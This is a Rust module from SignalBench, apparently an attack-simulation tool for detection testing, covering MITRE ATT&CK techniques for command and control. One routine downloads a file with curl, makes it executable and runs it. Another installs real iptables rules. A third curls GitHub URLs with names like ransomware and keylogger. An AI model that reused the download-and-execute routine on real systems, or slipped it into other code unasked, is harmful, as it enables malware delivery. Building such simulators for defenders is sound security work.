// SIGNALBENCH - Endpoint Telemetry Generator
// Command and Control technique telemetry patterns
// 
// This module contains command and control techniques according to MITRE ATT&CK framework
// Developed by Simon Sigre (simon@gocortex.io)
// Part of the GoCortex.io platform for security testing and validation

use crate::config::TechniqueConfig;
use crate::techniques::{AttackTechnique, CleanupFuture, ExecuteFuture, SimulationResult, Technique, TechniqueParameter};
use async_trait::async_trait;
use std::fs::{self, File};
use std::io::Write;
use std::path::Path;
use tokio::process::Command;
use log::{debug, error, info, warn};
use uuid::Uuid;

// ======================================
// T1105 - Ingress Tool Transfer
// ======================================
pub struct IngressToolTransfer {}

#[async_trait]
impl AttackTechnique for IngressToolTransfer {
    fn info(&self) -> Technique {
        Technique {
            id: "T1105".to_string(),
            name: "Ingress Tool Transfer".to_string(),
            description: "Generates telemetry for ingress tool transfer activities".to_string(),
            category: "COMMAND_AND_CONTROL".to_string(),
            parameters: vec![
                TechniqueParameter {
                    name: "url".to_string(),
                    description: "URL of the file to download".to_string(),
                    required: false,
                    default: Some("https://wildfire.paloaltonetworks.com/publicapi/test/elf".to_string()),
                },
                TechniqueParameter {
                    name: "output_file".to_string(),
                    description: "Path to save the downloaded file".to_string(),
                    required: false,
                    default: Some("/tmp/signalbench_tool_transfer".to_string()),
                },
                TechniqueParameter {
                    name: "log_file".to_string(),
                    description: "Path to save download and execution log".to_string(),
                    required: false,
                    default: Some("/tmp/signalbench_ingress_transfer.log".to_string()),
                },
                TechniqueParameter {
                    name: "execute".to_string(),
                    description: "Whether to attempt execution of downloaded file".to_string(),
                    required: false,
                    default: Some("true".to_string()),
                },
            ],
            detection: "Network monitoring can detect malicious file downloads and execution attempts".to_string(),
            cleanup_support: true,
            platforms: vec!["Linux".to_string()],
            permissions: vec!["user".to_string()],
            voltron_only: false,
        }
    }

    fn execute<'a>(
        &'a self,
        config: &'a TechniqueConfig,
        dry_run: bool,
    ) -> ExecuteFuture<'a> {
        Box::pin(async move {
            let technique_info = self.info();
            
            // Get parameters from config or use defaults
            let url = config
                .parameters
                .get("url")
                .unwrap_or(&"https://wildfire.paloaltonetworks.com/publicapi/test/elf".to_string())
                .clone();
            let output_file = config
                .parameters
                .get("output_file")
                .unwrap_or(&"/tmp/signalbench_malware_test".to_string())
                .clone();
            let log_file = config
                .parameters
                .get("log_file")
                .unwrap_or(&"/tmp/signalbench_ingress_transfer.log".to_string())
                .clone();
            let execute = config
                .parameters
                .get("execute")
                .unwrap_or(&"true".to_string())
                .clone()
                .to_lowercase() == "true";
            
            if dry_run {
                return Ok(SimulationResult {
                    technique_id: technique_info.id,
                    success: true,
                    message: format!("Would download file from {url} to {output_file} and attempt execution: {execute}"),
                    artifacts: vec![output_file.clone(), log_file.clone()],
                    cleanup_required: true,
                });
            }
            
            // Create log file
            let mut log_file_handle = File::create(&log_file)
                .map_err(|e| format!("Failed to create log file: {e}"))?;
                
            // Write header
            writeln!(log_file_handle, "# SignalBench Ingress Tool Transfer - Malware Download Telemetry").unwrap();
            writeln!(log_file_handle, "# MITRE ATT&CK Technique: T1105").unwrap();
            writeln!(log_file_handle, "# URL: {url}").unwrap();
            writeln!(log_file_handle, "# Output file: {output_file}").unwrap();
            writeln!(log_file_handle, "# Execute after download: {execute}").unwrap();
            writeln!(log_file_handle, "# Timestamp: {}", chrono::Local::now()).unwrap();
            writeln!(log_file_handle, "# --------------------------------------------------------").unwrap();
            
            // Download file using curl
            writeln!(log_file_handle, "\n## Downloading file from URL").unwrap();
            
            let download_start = chrono::Local::now();
            writeln!(log_file_handle, "Download started at: {download_start}").unwrap();
            
            // Use curl to download the file
            let curl_output = Command::new("curl")
                .arg("-L")  // Follow redirects
                .arg("-s")  // Silent mode
                .arg("-o")  // Output to file
                .arg(&output_file)
                .arg(&url)
                .output()
                .await;
                
            let download_end = chrono::Local::now();
            let download_duration = download_end.signed_duration_since(download_start);
            writeln!(log_file_handle, "Download completed at: {} (took {} ms)", 
                     download_end, download_duration.num_milliseconds()).unwrap();
            
            // Check download status
            match curl_output {
                Ok(output) => {
                    let exit_status = output.status.code().unwrap_or(-1);
                    let stderr = String::from_utf8_lossy(&output.stderr);
                    
                    if exit_status == 0 {
                        writeln!(log_file_handle, "Download successful!").unwrap();
                        
                        // Check if file exists and get its size
                        if let Ok(metadata) = std::fs::metadata(&output_file) {
                            let file_size = metadata.len();
                            writeln!(log_file_handle, "Downloaded file size: {file_size} bytes").unwrap();
                            
                            // Get file type
                            let file_type_output = Command::new("file")
                                .arg(&output_file)
                                .output()
                                .await;
                                
                            if let Ok(file_type_result) = file_type_output {
                                let file_type = String::from_utf8_lossy(&file_type_result.stdout);
                                writeln!(log_file_handle, "File type: {file_type}").unwrap();
                            }
                            
                            // Calculate file hash
                            let hash_output = Command::new("sha256sum")
                                .arg(&output_file)
                                .output()
                                .await;
                                
                            if let Ok(hash_result) = hash_output {
                                let hash_output = String::from_utf8_lossy(&hash_result.stdout);
                                writeln!(log_file_handle, "SHA256 hash: {hash_output}").unwrap();
                            }
                        } else {
                            writeln!(log_file_handle, "WARNING: File doesn't exist after successful download!").unwrap();
                        }
                    } else {
                        writeln!(log_file_handle, "Download failed with status code: {exit_status}").unwrap();
                        if !stderr.is_empty() {
                            writeln!(log_file_handle, "Error: {stderr}").unwrap();
                        }
                    }
                },
                Err(e) => {
                    writeln!(log_file_handle, "Download failed: {e}").unwrap();
                }
            }
            
            // Attempt execution if requested
            if execute {
                writeln!(log_file_handle, "\n## Attempting execution of downloaded file").unwrap();
                
                // First make it executable
                let chmod_output = Command::new("chmod")
                    .arg("+x")
                    .arg(&output_file)
                    .output()
                    .await;
                    
                match chmod_output {
                    Ok(output) => {
                        let exit_status = output.status.code().unwrap_or(-1);
                        if exit_status == 0 {
                            writeln!(log_file_handle, "Successfully set executable permissions").unwrap();
                            
                            // Now attempt to execute it
                            writeln!(log_file_handle, "Attempting execution...").unwrap();
                            let exec_start = chrono::Local::now();
                            
                            // Execute with timeout to prevent hanging
                            let exec_output = Command::new("timeout")
                                .arg("5")  // 5 second timeout
                                .arg(&output_file)
                                .output()
                                .await;
                                
                            let exec_end = chrono::Local::now();
                            let exec_duration = exec_end.signed_duration_since(exec_start);
                            
                            match exec_output {
                                Ok(output) => {
                                    let exit_status = output.status.code().unwrap_or(-1);
                                    let stdout = String::from_utf8_lossy(&output.stdout);
                                    let stderr = String::from_utf8_lossy(&output.stderr);
                                    
                                    writeln!(log_file_handle, "Execution completed at: {} (took {} ms)", 
                                             exec_end, exec_duration.num_milliseconds()).unwrap();
                                    writeln!(log_file_handle, "Exit status: {exit_status}").unwrap();
                                    
                                    if !stdout.is_empty() {
                                        let summary = if stdout.len() > 200 {
                                            format!("{}... (truncated)", &stdout[0..200])
                                        } else {
                                            stdout.to_string()
                                        };
                                        writeln!(log_file_handle, "STDOUT: {summary}").unwrap();
                                    }
                                    
                                    if !stderr.is_empty() {
                                        let summary = if stderr.len() > 200 {
                                            format!("{}... (truncated)", &stderr[0..200])
                                        } else {
                                            stderr.to_string()
                                        };
                                        writeln!(log_file_handle, "STDERR: {summary}").unwrap();
                                    }
                                },
                                Err(e) => {
                                    writeln!(log_file_handle, "Execution failed: {e}").unwrap();
                                }
                            }
                        } else {
                            writeln!(log_file_handle, "Failed to set executable permissions").unwrap();
                        }
                    },
                    Err(e) => {
                        writeln!(log_file_handle, "Failed to set executable permissions: {e}").unwrap();
                    }
                }
            }
            
            // Close log file
            drop(log_file_handle);
            
            info!("Ingress tool transfer complete, logs saved to {log_file}");
            
            Ok(SimulationResult {
                technique_id: technique_info.id,
                success: true,
                message: format!("Ingress tool transfer completed. File downloaded to {output_file}, Logs: {log_file}"),
                artifacts: vec![output_file.to_string(), log_file.to_string()],
                cleanup_required: true,
            })
        })
    }

    fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
        Box::pin(async move {
            for artifact in artifacts {
                if Path::new(artifact).exists() {
                    if let Err(e) = std::fs::remove_file(artifact) {
                        error!("Failed to remove artifact {artifact}: {e}");
                    } else {
                        debug!("Removed artifact: {artifact}");
                    }
                }
            }
            Ok(())
        })
    }
}

// ======================================
// T1205 - Traffic Signaling
// ======================================
pub struct TrafficSignaling {}

#[async_trait]
impl AttackTechnique for TrafficSignaling {
    fn info(&self) -> Technique {
        Technique {
            id: "T1205".to_string(),
            name: "Traffic Signalling - Port Knocking".to_string(),
            description: "ACTIVELY INSTALLS REAL IPTABLES RULES for port knock sequence detection on TCP ports 1337, 31337, 8080. Creates firewall LOG rules that generate syslog entries when SYN packets hit monitored ports. REQUIRES ELEVATED PRIVILEGES to manipulate netfilter. Network monitoring will detect these firewall rule modifications and logged connection attempts.".to_string(),
            category: "COMMAND_AND_CONTROL".to_string(),
            parameters: vec![
                TechniqueParameter {
                    name: "interface".to_string(),
                    description: "Network interface to monitor for port knocking".to_string(),
                    required: false,
                    default: Some("eth0".to_string()),
                },
                TechniqueParameter {
                    name: "knock_ports".to_string(),
                    description: "Comma-separated port knock sequence (default: 1337,31337,8080)".to_string(),
                    required: false,
                    default: Some("1337,31337,8080".to_string()),
                },
                TechniqueParameter {
                    name: "log_file".to_string(),
                    description: "Path to save port knocking installation log".to_string(),
                    required: false,
                    default: Some("/tmp/signalbench_port_knocking.log".to_string()),
                },
            ],
            detection: "Monitor iptables rule modifications, netfilter changes, syslog entries with 'PORT_KNOCK' prefix, unusual SYN packet logging, and firewall configuration changes. Detection tools: auditd, osquery, netfilter logs, syslog monitoring.".to_string(),
            cleanup_support: true,
            platforms: vec!["Linux".to_string()],
            permissions: vec!["root".to_string()],
            voltron_only: false,
        }
    }

    fn execute<'a>(
        &'a self,
        config: &'a TechniqueConfig,
        dry_run: bool,
    ) -> ExecuteFuture<'a> {
        Box::pin(async move {
            let interface = config
                .parameters
                .get("interface")
                .unwrap_or(&"eth0".to_string())
                .clone();
                
            let knock_ports = config
                .parameters
                .get("knock_ports")
                .unwrap_or(&"1337,31337,8080".to_string())
                .clone();
                
            let log_file = config
                .parameters
                .get("log_file")
                .unwrap_or(&"/tmp/signalbench_port_knocking.log".to_string())
                .clone();

            let id = Uuid::new_v4().to_string().split('-').next().unwrap_or("signalbench").to_string();
            
            // Parse port knock sequence
            let ports: Vec<&str> = knock_ports.split(',').map(|s| s.trim()).collect();
            
            if dry_run {
                info!("[DRY RUN] Would install iptables port knocking rules on interface: {interface}");
                info!("[DRY RUN] Would monitor ports: {knock_ports}");
                info!("[DRY RUN] Would create {} iptables LOG rules", ports.len());
                return Ok(SimulationResult {
                    technique_id: self.info().id,
                    success: true,
                    message: format!("DRY RUN: Would install iptables port knock detection for ports {knock_ports}"),
                    artifacts: vec![log_file],
                    cleanup_required: false,
                });
            }

            // Create log file
            let mut log_file_handle = File::create(&log_file)
                .map_err(|e| format!("Failed to create log file: {e}"))?;
                
            writeln!(log_file_handle, "# SignalBench Port Knocking Detection - REAL IPTABLES INSTALLATION").unwrap();
            writeln!(log_file_handle, "# MITRE ATT&CK: T1205 - Traffic Signalling").unwrap();
            writeln!(log_file_handle, "# Interface: {interface}").unwrap();
            writeln!(log_file_handle, "# Port Knock Sequence: {knock_ports}").unwrap();
            writeln!(log_file_handle, "# Session ID: {id}").unwrap();
            writeln!(log_file_handle, "# Timestamp: {}", chrono::Local::now()).unwrap();
            writeln!(log_file_handle, "# --------------------------------------------------------").unwrap();
            writeln!(log_file_handle, "# WARNING: This technique ACTIVELY INSTALLS FIREWALL RULES").unwrap();
            writeln!(log_file_handle, "# --------------------------------------------------------\n").unwrap();

            // Check if interface exists
            writeln!(log_file_handle, "## Network Interface Validation").unwrap();
            let interface_check = Command::new("ip")
                .args(["link", "show", &interface])
                .output()
                .await;
                
            match interface_check {
                Ok(output) => {
                    if !output.status.success() {
                        writeln!(log_file_handle, "⚠ WARNING: Interface {interface} not found").unwrap();
                        writeln!(log_file_handle, "Proceeding with any available interface\n").unwrap();
                    } else {
                        let output_str = String::from_utf8_lossy(&output.stdout);
                        writeln!(log_file_handle, "[OK] Interface {interface} is available").unwrap();
                        writeln!(log_file_handle, "Interface details:\n{}\n", output_str.lines().next().unwrap_or("")).unwrap();
                    }
                },
                Err(e) => {
                    writeln!(log_file_handle, "Could not verify interface: {e}\n").unwrap();
                }
            }

            // Store rule specifications for cleanup
            let mut installed_rules = Vec::new();
            let mut rule_numbers = Vec::new();

            // Get baseline rule count
            writeln!(log_file_handle, "## Baseline Firewall State").unwrap();
            let baseline_output = Command::new("iptables")
                .args(["-L", "INPUT", "--line-numbers", "-n"])
                .output()
                .await;
                
            if let Ok(output) = &baseline_output {
                let rules_text = String::from_utf8_lossy(&output.stdout);
                let count = rules_text.lines().filter(|line| line.chars().next().is_some_and(|c| c.is_ascii_digit())).count();
                writeln!(log_file_handle, "Current INPUT chain rules: {count}").unwrap();
            } else {
                writeln!(log_file_handle, "Could not query baseline (may need elevated privileges)").unwrap();
            }

            // Install iptables rules for each port in the knock sequence
            writeln!(log_file_handle, "\n## Installing Port Knock Detection Rules").unwrap();
            writeln!(log_file_handle, "Installing iptables LOG rules for SYN packet detection...\n").unwrap();

            for (idx, port) in ports.iter().enumerate() {
                let port = port.trim();
                let rule_id = format!("portkn ock_{id}_{port}");
                
                writeln!(log_file_handle, "### Port Knock Position {} - TCP Port {}", idx + 1, port).unwrap();
                
                // Build the iptables command for SYN packet logging
                let iptables_cmd = format!(
                    "iptables -A INPUT -p tcp --dport {port} --tcp-flags SYN SYN -j LOG --log-prefix 'PORT_KNOCK[{port}]: ' --log-level 4"
                );
                
                writeln!(log_file_handle, "Rule command: {iptables_cmd}").unwrap();
                
                // Execute the iptables command
                let result = Command::new("bash")
                    .arg("-c")
                    .arg(&iptables_cmd)
                    .output()
                    .await;
                    
                match result {
                    Ok(output) => {
                        let exit_code = output.status.code().unwrap_or(-1);
                        let stderr = String::from_utf8_lossy(&output.stderr);
                        let stdout = String::from_utf8_lossy(&output.stdout);
                        
                        if exit_code == 0 {
                            writeln!(log_file_handle, "[OK] Rule installed successfully").unwrap();
                            installed_rules.push(format!("{port}|{rule_id}"));
                            
                            // Try to get the rule number
                            let list_result = Command::new("iptables")
                                .args(["-L", "INPUT", "--line-numbers", "-n"])
                                .output()
                                .await;
                                
                            if let Ok(list_output) = list_result {
                                let rules_text = String::from_utf8_lossy(&list_output.stdout);
                                // Count current rules to estimate our rule number
                                let current_count = rules_text.lines().filter(|line| line.chars().next().is_some_and(|c| c.is_ascii_digit())).count();
                                let estimated_rule_num = current_count;
                                rule_numbers.push(estimated_rule_num);
                                writeln!(log_file_handle, "Estimated rule number: {estimated_rule_num}").unwrap();
                            }
                        } else {
                            writeln!(log_file_handle, "✗ Failed to install rule (exit code: {exit_code})").unwrap();
                            if !stderr.is_empty() {
                                writeln!(log_file_handle, "Error: {stderr}").unwrap();
                            }
                            if stderr.contains("Permission denied") || stderr.contains("Operation not permitted") {
                                writeln!(log_file_handle, "⚠ REQUIRES ROOT/SUDO PRIVILEGES").unwrap();
                            }
                        }
                        
                        if !stdout.is_empty() {
                            writeln!(log_file_handle, "Output: {stdout}").unwrap();
                        }
                    },
                    Err(e) => {
                        writeln!(log_file_handle, "✗ Failed to execute iptables command: {e}").unwrap();
                    }
                }
                writeln!(log_file_handle).unwrap();
            }

            // Display final firewall state
            writeln!(log_file_handle, "## Final Firewall State").unwrap();
            let final_check = Command::new("iptables")
                .args(["-L", "INPUT", "--line-numbers", "-n", "-v"])
                .output()
                .await;
                
            match final_check {
                Ok(output) => {
                    let rules = String::from_utf8_lossy(&output.stdout);
                    writeln!(log_file_handle, "Complete INPUT chain with line numbers:\n").unwrap();
                    writeln!(log_file_handle, "{rules}").unwrap();
                    
                    // Highlight our rules
                    writeln!(log_file_handle, "\n### Installed Port Knock Rules:").unwrap();
                    for line in rules.lines() {
                        if line.contains("PORT_KNOCK") {
                            writeln!(log_file_handle, "→ {line}").unwrap();
                        }
                    }
                },
                Err(e) => {
                    writeln!(log_file_handle, "Could not query final state: {e}").unwrap();
                    writeln!(log_file_handle, "(This is expected if not running with elevated privileges)").unwrap();
                }
            }

            // Test with actual SYN packet attempt (informational only)
            writeln!(log_file_handle, "\n## Port Knock Detection Test").unwrap();
            writeln!(log_file_handle, "To test the port knock detection, execute SYN packets to ports in sequence:").unwrap();
            for (idx, port) in ports.iter().enumerate() {
                writeln!(log_file_handle, "  Step {}: nmap -sS -p{} <target> (or: nc -zv <target> {})", idx + 1, port, port).unwrap();
            }
            writeln!(log_file_handle, "\nMonitor syslog for PORT_KNOCK entries:").unwrap();
            writeln!(log_file_handle, "  tail -f /var/log/syslog | grep PORT_KNOCK").unwrap();
            writeln!(log_file_handle, "  journalctl -f | grep PORT_KNOCK").unwrap();

            drop(log_file_handle);
            
            info!("Port knocking iptables rules installed for ports: {knock_ports}");
            info!("Installed {} iptables LOG rules", installed_rules.len());
            
            // Build artifacts list with rule tracking data
            let mut artifacts = vec![log_file.clone()];
            artifacts.push(format!("session_{id}"));
            
            // Add each installed rule for cleanup tracking
            for rule_spec in &installed_rules {
                artifacts.push(format!("ipt_rule|{rule_spec}"));
            }
            
            let success_count = installed_rules.len();
            let total_ports = ports.len();
            
            Ok(SimulationResult {
                technique_id: self.info().id,
                success: success_count > 0,
                message: format!(
                    "Port knock detection installed: {success_count}/{total_ports} iptables rules active. Ports monitored: {knock_ports}. Session ID: {id}. Check {log_file} for details."
                ),
                artifacts,
                cleanup_required: true,
            })
        })
    }

    fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
        Box::pin(async move {
            let mut session_id: Option<String> = None;
            
            // First pass: find session ID
            for artifact in artifacts {
                if artifact.starts_with("session_") {
                    session_id = Some(artifact.trim_start_matches("session_").to_string());
                    break;
                }
            }
            
            info!("Starting T1205 Port Knocking cleanup");
            if let Some(ref id) = session_id {
                info!("Session ID: {id}");
            }
            
            // Track cleanup success
            let mut rules_removed = 0;
            let mut rules_failed = 0;
            
            for artifact in artifacts {
                // Remove iptables rules
                if artifact.starts_with("ipt_rule|") {
                    let rule_data = artifact.trim_start_matches("ipt_rule|");
                    let parts: Vec<&str> = rule_data.split('|').collect();
                    
                    if !parts.is_empty() {
                        let port = parts[0];
                        
                        info!("Removing iptables rule for port {port}");
                        
                        // Method 1: Delete by exact specification (most reliable)
                        let delete_cmd = format!(
                            "iptables -D INPUT -p tcp --dport {port} --tcp-flags SYN SYN -j LOG --log-prefix 'PORT_KNOCK[{port}]: ' --log-level 4 2>/dev/null"
                        );
                        
                        let delete_result = Command::new("bash")
                            .arg("-c")
                            .arg(&delete_cmd)
                            .output()
                            .await;
                            
                        match delete_result {
                            Ok(output) => {
                                let exit_code = output.status.code().unwrap_or(-1);
                                let stderr = String::from_utf8_lossy(&output.stderr);
                                
                                if exit_code == 0 {
                                    info!("[OK] Successfully removed iptables rule for port {port}");
                                    rules_removed += 1;
                                } else {
                                    warn!("Failed to remove iptables rule for port {port} (exit code: {exit_code})");
                                    if !stderr.is_empty() {
                                        warn!("Error: {stderr}");
                                    }
                                    
                                    // Method 2: Try to find and delete by line number with PORT_KNOCK prefix
                                    info!("Attempting alternative removal method for port {port}...");
                                    
                                    let list_result = Command::new("iptables")
                                        .args(["-L", "INPUT", "--line-numbers", "-n"])
                                        .output()
                                        .await;
                                        
                                    if let Ok(list_output) = list_result {
                                        let rules_text = String::from_utf8_lossy(&list_output.stdout);
                                        
                                        // Find line numbers containing our PORT_KNOCK marker for this port
                                        let port_knock_marker = format!("PORT_KNOCK[{port}]");
                                        let mut line_numbers_to_delete = Vec::new();
                                        
                                        for line in rules_text.lines() {
                                            if line.contains(&port_knock_marker) {
                                                // Extract line number (first token)
                                                if let Some(line_num_str) = line.split_whitespace().next() {
                                                    if let Ok(line_num) = line_num_str.parse::<usize>() {
                                                        line_numbers_to_delete.push(line_num);
                                                    }
                                                }
                                            }
                                        }
                                        
                                        // Delete rules by line number (in reverse order to maintain numbering)
                                        line_numbers_to_delete.sort();
                                        line_numbers_to_delete.reverse();
                                        
                                        for line_num in line_numbers_to_delete {
                                            let delete_by_num_cmd = format!("iptables -D INPUT {line_num}");
                                            let num_result = Command::new("bash")
                                                .arg("-c")
                                                .arg(&delete_by_num_cmd)
                                                .output()
                                                .await;
                                                
                                            match num_result {
                                                Ok(num_output) => {
                                                    if num_output.status.code().unwrap_or(-1) == 0 {
                                                        info!("[OK] Removed rule at line {line_num} for port {port}");
                                                        rules_removed += 1;
                                                    } else {
                                                        warn!("Failed to remove rule at line {line_num}");
                                                        rules_failed += 1;
                                                    }
                                                },
                                                Err(e) => {
                                                    warn!("Failed to execute delete by line number: {e}");
                                                    rules_failed += 1;
                                                }
                                            }
                                        }
                                    } else {
                                        warn!("Could not list iptables rules for alternative removal");
                                        rules_failed += 1;
                                    }
                                }
                            },
                            Err(e) => {
                                warn!("Failed to execute iptables delete command for port {port}: {e}");
                                rules_failed += 1;
                            }
                        }
                    }
                }
                
                // Remove log files
                if artifact.ends_with("port_knocking.log") && Path::new(artifact).exists() {
                    if let Err(e) = fs::remove_file(artifact) {
                        warn!("Failed to remove log file {artifact}: {e}");
                    } else {
                        info!("Removed log file: {artifact}");
                    }
                }
            }
            
            // Verify cleanup
            info!("Cleanup summary: {rules_removed} rules removed, {rules_failed} failed");
            
            // Final verification - check if any PORT_KNOCK rules remain
            let verify_result = Command::new("iptables")
                .args(["-L", "INPUT", "-n"])
                .output()
                .await;
                
            if let Ok(output) = verify_result {
                let rules = String::from_utf8_lossy(&output.stdout);
                let remaining = rules.lines().filter(|line| line.contains("PORT_KNOCK")).count();
                
                if remaining > 0 {
                    warn!("⚠ Warning: {remaining} PORT_KNOCK rules still present in iptables");
                    warn!("Manual cleanup may be required: iptables -L INPUT -n --line-numbers | grep PORT_KNOCK");
                } else {
                    info!("[OK] Cleanup verified: No PORT_KNOCK rules remain");
                }
            }
            
            Ok(())
        })
    }
}
pub struct SuspiciousGitHubToolTransfer {}

#[async_trait]
impl AttackTechnique for SuspiciousGitHubToolTransfer {
    fn info(&self) -> Technique {
        Technique {
            id: "T1105.001".to_string(),
            name: "Suspicious GitHub Tool Transfer".to_string(),
            description: "Generates telemetry for curl requests to suspicious fictional GitHub repositories with hacker-themed names".to_string(),
            category: "COMMAND_AND_CONTROL".to_string(),
            parameters: vec![
                TechniqueParameter {
                    name: "repo_count".to_string(),
                    description: "Number of suspicious GitHub repos to attempt downloading from".to_string(),
                    required: false,
                    default: Some("5".to_string()),
                },
                TechniqueParameter {
                    name: "log_file".to_string(),
                    description: "Path to save download attempt log".to_string(),
                    required: false,
                    default: Some("/tmp/signalbench_github_downloads.log".to_string()),
                },
            ],
            detection: "Monitor for curl/wget requests to GitHub repositories with suspicious names or patterns indicating potential tool downloads".to_string(),
            cleanup_support: true,
            platforms: vec!["Linux".to_string()],
            permissions: vec!["user".to_string()],
            voltron_only: false,
        }
    }

    fn execute<'a>(
        &'a self,
        config: &'a TechniqueConfig,
        dry_run: bool,
    ) -> ExecuteFuture<'a> {
        use rand::seq::SliceRandom;
        
        let repo_count: usize = config
            .parameters
            .get("repo_count")
            .unwrap_or(&"5".to_string())
            .parse()
            .unwrap_or(5);
            
        let log_file = config
            .parameters
            .get("log_file")
            .unwrap_or(&"/tmp/signalbench_github_downloads.log".to_string())
            .clone();

        // Suspicious GitHub repository suffixes for simulation
        let suspicious_suffixes = vec![
            "exploit-kit", "root-shell", "payload-gen", "backdoor-tool", "credential-dumper",
            "ransomware", "keylogger", "botnet-client", "webshell", "privesc-tools",
            "password-cracker", "network-scanner", "c2-framework", "trojan-builder", "stealer",
            "rat-client", "rootkit-installer", "crypto-miner", "exfil-toolkit", "persistence-engine",
        ];

        // Generate random selections BEFORE async block
        let mut rng = rand::thread_rng();
        let mut repo_list = Vec::new();
        for _ in 0..repo_count {
            let suffix = suspicious_suffixes.choose(&mut rng).unwrap_or(&"backdoor-tool");
            let repo_url = format!("https://github.com/simonsigre/{suffix}");
            repo_list.push((suffix.to_string(), repo_url));
        }

        Box::pin(async move {

            if dry_run {
                let repos: Vec<String> = repo_list.iter()
                    .map(|(name, _)| name.clone())
                    .collect();
                info!("[DRY RUN] Would attempt to download from GitHub repos: {}", repos.join(", "));
                return Ok(SimulationResult {
                    technique_id: self.info().id,
                    success: true,
                    message: format!("DRY RUN: Would attempt {repo_count} GitHub downloads"),
                    artifacts: vec![log_file],
                    cleanup_required: false,
                });
            }

            // Create the log file
            let mut log = File::create(&log_file)
                .map_err(|e| format!("Failed to create log file: {e}"))?;
            
            writeln!(log, "=== SignalBench Suspicious GitHub Tool Transfer ===")
                .map_err(|e| format!("Failed to write to log file: {e}"))?;
            writeln!(log, "Time: {}", chrono::Local::now().to_rfc3339())
                .map_err(|e| format!("Failed to write to log file: {e}"))?;
            writeln!(log, "Repository count: {repo_count}")
                .map_err(|e| format!("Failed to write to log file: {e}"))?;
            writeln!(log)
                .map_err(|e| format!("Failed to write to log file: {e}"))?;

            // Attempt to curl each suspicious GitHub repo
            for (repo_name, repo_url) in &repo_list {
                writeln!(log, "=== Attempting download: {repo_name} ===")
                    .map_err(|e| format!("Failed to write to log file: {e}"))?;
                writeln!(log, "URL: {repo_url}")
                    .map_err(|e| format!("Failed to write to log file: {e}"))?;

                info!("Attempting suspicious GitHub download: {repo_url}");
                
                // Execute curl command (will fail as these are fictional repos, but generates telemetry)
                let output = Command::new("curl")
                    .args(["-s", "-I", "-L", "--max-time", "5", repo_url])
                    .output()
                    .await;

                match output {
                    Ok(output) => {
                        writeln!(log, "Exit Code: {}", output.status.code().unwrap_or(-1))
                            .map_err(|e| format!("Failed to write to log file: {e}"))?;
                        writeln!(log, "Response:")
                            .map_err(|e| format!("Failed to write to log file: {e}"))?;
                        log.write_all(&output.stdout)
                            .map_err(|e| format!("Failed to write to log file: {e}"))?;
                        if !output.stderr.is_empty() {
                            writeln!(log, "Errors:")
                                .map_err(|e| format!("Failed to write to log file: {e}"))?;
                            log.write_all(&output.stderr)
                                .map_err(|e| format!("Failed to write to log file: {e}"))?;
                        }
                    },
                    Err(e) => {
                        writeln!(log, "Error executing curl: {e}")
                            .map_err(|e| format!("Failed to write to log file: {e}"))?;
                    }
                }

                writeln!(log)
                    .map_err(|e| format!("Failed to write to log file: {e}"))?;
            }

            info!("Completed {repo_count} suspicious GitHub download attempts");
            
            Ok(SimulationResult {
                technique_id: self.info().id,
                success: true,
                message: format!("Successfully attempted {repo_count} suspicious GitHub downloads"),
                artifacts: vec![log_file],
                cleanup_required: true,
            })
        })
    }

    fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
        Box::pin(async move {
            for artifact in artifacts {
                if Path::new(artifact).exists() {
                    match fs::remove_file(artifact) {
                        Ok(_) => info!("Removed artifact: {artifact}"),
                        Err(e) => warn!("Failed to remove artifact {artifact}: {e}"),
                    }
                }
            }
            Ok(())
        })
    }
}
